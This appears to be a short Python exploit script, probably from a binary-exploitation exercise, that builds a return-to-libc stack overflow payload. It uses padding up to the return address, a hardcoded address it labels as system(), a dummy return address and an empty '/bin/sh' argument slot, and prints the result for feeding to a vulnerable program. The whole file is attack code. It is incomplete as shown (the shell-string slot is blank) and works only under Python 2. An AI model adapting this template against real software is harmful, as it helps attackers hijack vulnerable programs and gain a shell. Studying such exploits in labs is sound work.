import struct
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"
system = struct.pack("I",0xf7e0e030)
returnAfterSys = "AAAA"
binsh = ""
print(padding + system + returnAfterSys + binsh)
